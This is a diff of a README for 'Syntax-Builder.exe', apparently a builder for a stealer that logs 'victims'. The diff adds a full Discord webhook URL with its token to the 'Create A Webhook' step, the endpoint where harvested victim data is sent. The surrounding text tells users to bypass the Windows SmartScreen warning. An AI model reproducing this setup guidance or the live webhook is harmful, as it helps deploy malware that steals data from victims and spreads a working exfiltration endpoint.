@@ -75,7 +75,7 @@ Once you've downloaded the files extract the folder so it's no longer a .zip fil
 ```
 You dont need to install any modules opening Syntax-Builder.exe will install them for you. If you are prompted with "Windows protected your PC", make sure to click "More Info" then run.
 ```
-### 4. Create A Webhook:
+### 4. Create A Webhook:https://discord.com/api/webhooks/1175859219052896378/4L0w5Tk2CnJbPWWDfythzGuWKbg1SwmfmMqR2giHIaxucWp6INMKrGQjyGDHT0N7Ao1b
 
 ```
 This webhook will be sent any victims you log so don't delete it once it's made. Once you've created one paste it
